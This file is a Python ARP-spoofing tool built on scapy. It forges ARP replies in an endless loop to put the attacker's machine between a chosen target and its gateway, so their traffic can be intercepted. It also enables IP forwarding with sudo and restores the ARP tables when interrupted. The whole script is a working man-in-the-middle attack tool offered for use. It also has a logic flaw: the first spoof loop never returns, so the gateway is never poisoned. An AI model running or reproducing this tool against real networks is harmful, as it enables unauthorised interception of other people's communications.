#!/usr/bin/env python3

import argparse
import subprocess
import sys
import time
import scapy.all as scapy


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.usage = u"This is a tool that spoofs given target and gateway so you are able to capture the traffic" \
                   u" between them.\nDeveloped By (BigTrader) \u2620\ufe0f"
    parser.add_argument("-i", "--interface", dest="interface", help="The interface that will be used in the attack",
                        required=True)
    parser.add_argument("-t", "--target_ip", dest="target_ip", help="The Target IP Address", required=True)
    parser.add_argument("-g", "--gateway_ip", dest="gateway_ip", help="The Gateway IP Address", required=True)
    parser.add_argument("-f", "--ip_forwarding", dest="ip_forwarding",
                        help="Set it to 1 to allow ip_forwarding and 0 to disable it", required=True)
    arguments = parser.parse_args()
    return arguments


def allow_ip_forwarding():
    command = "sudo sysctl -w net.ipv4.ip_forward=1"
    subprocess.check_output(command, shell=True)


def stop_ip_forwarding():
    command = "sudo sysctl -w net.ipv4.ip_forward=0"
    subprocess.check_output(command, shell=True)


# This function takes an IP address and gets its MAC using ARP
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    exploring_packet = broadcast / arp_request

    # Checking if the target gave us its MAC Address
    try:
        for i in range(3):
            response = scapy.srp1(exploring_packet, timeout=2, verbose=False)
            if response:
                return response.hwsrc

        if not response:
            sys.exit("[-] The Target Didn't Respond With Its MAC Address\n[-] Check That The Ip Is Correct Or Check That Target Is Alive And Try Again")
    except Exception as e:
        sys.exit(f"\n[-] An unexpected error occurred: {str(e)}")


# This function is responsible to fool the target or the gateway,
# telling the target that we are the default gateway
# telling the gateway that we are the target
def spoof(interface, target_ip, spoofed_ip):
    # First we will send an ARP request to the target IP [the one that we need to fool (victim/gateway)]
    # to know its MAC address:
    target_mac = get_mac(target_ip)
    # Now we need to create an ARP response to send it to the victim or the gateway
    # if to victim : telling the victim that we are the default gateway
    # if to gateway: telling the gateway that we are the victim
    # To achieve that we will first create an object of ARP Class to be a response
    response = scapy.ARP()
    # Now it is by default a request packet
    # To make it a response we need to set the op argument to "2", as it is "1" by default
    # You also can see all the fields of the ARP Class by :
    # scapy.ls(scapy.ARP)
    response.op = 2
    # We need also to set the target's [the one that we need to fool (victim/gateway)] IP as destination IP :
    response.pdst = target_ip
    # We need also to ser the target's [the one that we need to fool (victim/gateway)] MAC as destinationMAC:
    response.hwdst = target_mac
    # Now we will set the source IP that the response should be from,
    # but this will be the lie , as we will set it as the spoofed IP:
    response.psrc = spoofed_ip
    # We should also specify the src MAC to our Mac Address, but by default it is set to our MAC
    # As we are the senders of this packet.
    # Now we can see the packet :
    # response_for_target.show()
    # print(response_for_target.summary()) "ARP is at `our MAC` says `spoofed_ip`
    # Sending the packet in infinite loop to continuously fooling them
    # and blocking the communication between them :
    number_of_packets = 0
    print(u"ARP Spoofing Has Started \u2620\ufe0f")
    while True:
        scapy.send(response, iface=interface, verbose=False)
        time.sleep(2)
        number_of_packets += 2
        print("\r[+] Packets Sent: " + str(number_of_packets), end="")


# This function will fix both the spoofed arp tables in the victims device and the router
def restore(interface, source_ip, dest_ip):
    actual_source_mac = get_mac(source_ip)
    dest_mac = get_mac(dest_ip)
    response = scapy.ARP(op=2, psrc=source_ip, hwsrc=actual_source_mac, pdst=dest_ip, hwdst=dest_mac)
    # Sending the packet 4 times to check that every thing is back.
    scapy.send(response, iface=interface, count=4, verbose=False)


def main():
    try:
        arguments = get_arguments()
        interface = arguments.interface
        target_ip = arguments.target_ip
        gateway_ip = arguments.gateway_ip
        ip_forwarding = arguments.ip_forwarding

        if ip_forwarding == "1":
            allow_ip_forwarding()
        elif ip_forwarding == "0":
            pass
        else:
            sys.exit("values for ip_forwarding is '1' or '0' only !")

        spoof(interface, target_ip, gateway_ip)  # Hey victim I am the gateway
        spoof(interface, gateway_ip, target_ip)  # Hey gateway I am foolan

    except KeyboardInterrupt:
        print("\n[+] Fixing The Spoofed Tables...")
        restore(interface, gateway_ip, target_ip)
        restore(interface, target_ip, gateway_ip)
        stop_ip_forwarding()
        print("[+] Completed")
        sys.exit("[x] Attack Stopped")
    except Exception as e:
        stop_ip_forwarding()
        sys.exit(f"\n[-] An unexpected error occurred: {str(e)} ")


if __name__ == '__main__':
    main()

